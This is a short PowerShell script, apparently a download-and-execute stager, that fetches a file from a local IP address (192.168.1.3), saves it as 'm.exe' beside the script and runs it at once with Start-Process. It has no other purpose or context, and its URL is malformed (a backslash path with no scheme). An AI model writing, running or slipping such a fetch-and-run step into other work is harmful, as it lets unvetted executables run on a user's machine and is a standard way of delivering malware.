$url = "192.168.1.3\e"
$fileName = "m.exe"
$outputFilePath = Join-Path -Path $PSScriptRoot -ChildPath $fileName

Invoke-WebRequest -Uri $url -OutFile $outputFilePath

# Check if the download was successful
if (Test-Path $outputFilePath) {
    Write-Host "Download successful. Running the downloaded file."

    # Run the downloaded file
    Start-Process -FilePath $outputFilePath

} else {
    Write-Host "Download failed. The file could not be downloaded."
}